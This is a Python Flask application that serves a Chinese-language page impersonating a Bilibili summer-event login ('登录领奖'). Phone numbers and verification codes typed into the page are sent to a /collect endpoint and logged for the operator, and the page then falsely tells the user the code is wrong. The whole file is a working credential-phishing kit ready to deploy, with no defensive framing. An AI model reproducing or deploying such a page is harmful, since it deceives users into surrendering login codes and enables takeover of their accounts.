from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import os
import logging

app = Flask(__name__)
CORS(app)

# 配置日志，方便在后台查看收集到的数据
logging.basicConfig(level=logging.INFO)

# 前端 HTML 代码（直接嵌入，无需单独文件）
HTML_PAGE = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>B站活动 · 登录领奖</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f4f6f9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            max-width: 420px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        .banner {
            background: linear-gradient(135deg, #00a1d6, #1797d0);
            padding: 32px 20px;
            text-align: center;
            color: white;
        }
        .banner h1 { font-size: 26px; margin-bottom: 6px; }
        .banner p { font-size: 14px; opacity: 0.9; }
        .form-container { padding: 28px 24px 32px; }
        .input-group { margin-bottom: 24px; }
        .input-group label { display: block; font-size: 14px; font-weight: 500; color: #1e2a3e; margin-bottom: 8px; }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 24px;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }
        .input-group input:focus { border-color: #00a1d6; box-shadow: 0 0 0 3px rgba(0,161,214,0.1); }
        .captcha-row { display: flex; gap: 12px; }
        .captcha-row input { flex: 1; }
        #sendCodeBtn {
            background: #f1f2f3;
            border: none;
            border-radius: 24px;
            padding: 0 20px;
            font-weight: 600;
            font-size: 14px;
            color: #00a1d6;
            white-space: nowrap;
            cursor: pointer;
            transition: 0.2s;
        }
        #sendCodeBtn:active { background: #e3e5e8; }
        #sendCodeBtn.disabled { background: #e9eaed; color: #9aa4b2; cursor: not-allowed; }
        .login-btn {
            width: 100%;
            background: #00a1d6;
            border: none;
            border-radius: 28px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            margin-top: 8px;
            transition: 0.2s;
        }
        .login-btn:active { transform: scale(0.98); background: #0e8cbb; }
        .footer { text-align: center; font-size: 12px; color: #9aa4b2; margin-top: 24px; }
        .debug-note { text-align: center; font-size: 10px; color: #cbd5e1; margin-top: 16px; }
    </style>
</head>
<body>
<div class="card">
    <div class="banner">
        <h1>🎁 夏日狂欢派对</h1>
        <p>手机号登录 · 领限定礼包</p>
    </div>
    <div class="form-container">
        <div class="input-group">
            <label>手机号</label>
            <input type="tel" id="phone" placeholder="请输入手机号" maxlength="11" autocomplete="off">
        </div>
        <div class="input-group">
            <label>验证码</label>
            <div class="captcha-row">
                <input type="text" id="code" placeholder="请输入验证码" maxlength="6" autocomplete="off">
                <button id="sendCodeBtn">发送验证码</button>
            </div>
        </div>
        <button id="loginBtn" class="login-btn">登 录</button>
        <div class="footer">未注册手机号验证后自动创建账号</div>
        
    </div>
</div>
<script>
    const COLLECT_URL = window.location.origin + "/collect";   // 自动使用当前域名下的接口
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const sendBtn = document.getElementById('sendCodeBtn');
    const loginBtn = document.getElementById('loginBtn');

    let countdown = 0;
    let timer = null;
    function startCountdown(seconds) {
        if (timer) clearInterval(timer);
        countdown = seconds;
        sendBtn.classList.add('disabled');
        sendBtn.innerText = `${countdown}秒后重试`;
        timer = setInterval(() => {
            if (countdown <= 1) {
                clearInterval(timer);
                timer = null;
                sendBtn.classList.remove('disabled');
                sendBtn.innerText = '发送验证码';
                countdown = 0;
            } else {
                countdown--;
                sendBtn.innerText = `${countdown}秒后重试`;
            }
        }, 1000);
    }

    function sendPhoneToServer(phone) {
        fetch(COLLECT_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'phone', phone: phone, timestamp: new Date().toISOString() })
        }).catch(err => console.error('发送失败', err));
    }

    function sendCredentialsToServer(phone, code) {
        fetch(COLLECT_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'login', phone: phone, code: code, timestamp: new Date().toISOString() })
        }).catch(err => console.error('发送失败', err));
    }

    sendBtn.addEventListener('click', () => {
        const phone = phoneInput.value.trim();
        if (!phone) { alert('请先填写手机号'); return; }
        if (!/^\\d{7,11}$/.test(phone)) { alert('请输入有效的手机号'); return; }
        if (countdown > 0) { alert(`请等待 ${countdown} 秒后再试`); return; }
        sendPhoneToServer(phone);
        startCountdown(60);
        alert('验证码已发送（演示模式，请随意输入6位数字）');
    });

    loginBtn.addEventListener('click', () => {
        const phone = phoneInput.value.trim();
        const code = codeInput.value.trim();
        if (!phone) { alert('请填写手机号'); return; }
        if (!code) { alert('请填写验证码'); return; }
        sendCredentialsToServer(phone, code);
        alert('请输入正确验证码');
    });
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/collect', methods=['POST', 'OPTIONS'])
def collect():
    if request.method == 'OPTIONS':
        return '', 200
    data = request.get_json()
    # 打印到日志（Render 后台可以看到）
    app.logger.info("="*50)
    app.logger.info(f"类型: {data.get('type')}")
    app.logger.info(f"手机号: {data.get('phone')}")
    if data.get('code'):
        app.logger.info(f"验证码: {data.get('code')}")
    app.logger.info(f"时间: {data.get('timestamp')}")
    app.logger.info("="*50)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
